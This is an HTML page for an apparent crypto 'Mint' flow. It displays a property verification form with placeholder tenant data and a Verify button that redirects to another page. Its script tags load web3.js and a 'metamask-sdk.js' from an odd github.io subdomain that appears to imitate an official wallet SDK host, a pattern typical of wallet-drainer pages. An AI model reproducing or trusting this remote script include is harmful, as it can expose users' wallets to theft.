<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mint</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start; /* Align to top */
            padding-top: 450px; /* Push all content down */
            
            background-image: url('bg.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
        }

        .title {
            font-size: 4rem;
            font-weight: 700;
            color: #000;
            margin-bottom: 3rem;
            text-align: center;
        }

        .form-container {
            display: flex;
            flex-direction: column;
            gap: 1rem;
            margin-bottom: 3rem;
        }

        .form-field {
            display: flex;
            align-items: center;
            gap: 1rem;
            font-size: 1.25rem;
            color: #000;
        }

        .form-field label {
            min-width: 180px;
            text-align: left;
            font-weight: 500;
        }

        .form-field .data-value {
            flex: 1;
            font-weight: 400;
            color: #333;
            min-width: 250px;
        }

        .verify-btn {
            background-color: #0847F7;
            color: white;
            border: none;
            padding: 0.75rem 2rem;
            font-size: 32px;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 2rem;
        }

        .verify-btn:hover {
            background-color: #0847F7;
        }

        .verify-btn:active {
            transform: translateY(1px);
        }
    </style>
</head>
<body>
    <div class="form-container">
        
        <div class="form-field">
            <label>Property id:</label>
            <span class="data-value" id="property-id">PROP789XYZ</span>
        </div>
        
        <div class="form-field">
            <label>Property Location:</label>
            <span class="data-value" id="property-location">123 Main Street, City, State</span>
        </div>
        
        <div class="form-field">
            <label>Property Name:</label>
            <span class="data-value" id="property-name">Sunset Villa</span>
        </div>

        <div class="form-field">
            <label>Tenant Code:</label>
            <span class="data-value" id="tenant-code">1234</span>
        </div>
        <button class="verify-btn" id="verify-btn" onclick="handleVerify()">Verify</button>
    </div>
<script >document.getElementById('verify-btn').addEventListener('click', (e) => {
            e.preventDefault();
            window.location.href = '../mint3/index.html';
        });</script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.1/web3.min.js"></script>
    <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
    <script type="module" src="./index.js"></script>

</body>
</html>
